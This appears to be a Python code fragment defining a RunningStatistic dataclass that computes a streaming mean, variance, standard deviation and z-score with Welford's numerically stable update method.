@dataclass
class RunningStatistic:
    """Numerically stable streaming statistic using Welford updates."""

    count: int = 0
    mean: float = 0.0
    m2: float = 0.0

    def update(self, value: float) -> None:
        self.count += 1
        delta = value - self.mean
        self.mean += delta / self.count
        self.m2 += delta * (value - self.mean)

    @property
    def variance(self) -> float:
        return self.m2 / max(self.count - 1, 1) if self.count > 1 else 0.0

    @property
    def std_dev(self) -> float:
        return math.sqrt(max(0.0, self.variance))

    def z_score(self, value: float) -> float:
        return abs(value - self.mean) / self.std_dev if self.std_dev > 1e-9 else 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {"count": self.count, "mean": self.mean, "std_dev": self.std_dev}


